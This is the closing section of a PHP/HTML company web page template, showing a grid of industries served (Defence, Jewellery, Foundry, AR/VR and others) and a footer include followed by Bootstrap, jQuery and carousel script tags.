                              <p class="name text-white">Power and Energy</p>
                           </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <!--row end-->
            <!--row start-->
            <div class="row ">
               <div class="col-md-6">
                  <div class="row">
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-17.svg"  class="img-fluid" alt="Defence"></a>
                           <a href="">
                              <p class="name text-white">Defence</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-18.svg"  class="img-fluid" alt="Jewellery"></a>
                           <a href="">
                              <p class="name text-white">Jewellery</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-19.svg"  class="img-fluid" alt="Enginering Service"></a>
                           <a href="">
                              <p class="name text-white">Enginering Service</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-20.svg"  class="img-fluid" alt="Archeology and Heritage Preservation"></a>
                           <a href="">
                              <p class="name text-white">Archeology and Heritage Preservation</p>
                           </a>
                        </div>
                     </div>
                  </div>
               </div>
               <div class="col-md-6">
                  <div class="row">
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-21.svg"  class="img-fluid" alt="Agricultural Machinery"></a>
                           <a href="">
                              <p class="name text-white">Agricultural Machinery</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-22.svg"  class="img-fluid" alt="Tire Industry"></a>
                           <a href="">
                              <p class="name text-white">Tire Industry</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-23.svg"  class="img-fluid" alt="Foundry"></a>
                           <a href="">
                              <p class="name text-white">Foundry</p>
                           </a>
                        </div>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6 text-center px-2 ind-icon">
                        <div class=" my-2">
                           <a href=""><img src="assets/images/icons/ind-24.svg"  class="img-fluid" alt="AR/VR"></a>
                           <a href="">
                              <p class="name text-white">AR/VR</p>
                           </a>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
            <!--row end-->
         </div>
      </section>
      <!--industry serve section end -->
      
      <!--separator start-->
      <hr class="separator">
      <!--separator end-->
      
      <!-- footer start -->
      <?php include('includes/footer.php');?>
      <!-- footer end -->
      
      <!-- bootstrap links-->
      <script type="text/javascript" src="assets/js/bootstrap.js"></script>
      <script type="text/javascript" src="assets/js/slim.min.js"></script>
      <script type="text/javascript" src="assets/js/bootstrap.bundle.js"></script>
      <!-- bootstrap links-->
      
      <script src="https:cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js"></script>
      <script src="assets/js/custom-owl.js" type="text/javascript"></script>
      <script src="https:cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
      <script src="https:cdnjs.cloudflare.com/ajax/libs/waypoints/4.0.1/jquery.waypoints.min.js"></script>
      <script src="https:cdnjs.cloudflare.com/ajax/libs/Counter-Up/1.0.0/jquery.counterup.min.js"></script>
      <script src="assets/js/counter.js"></script>
   </body>
</html>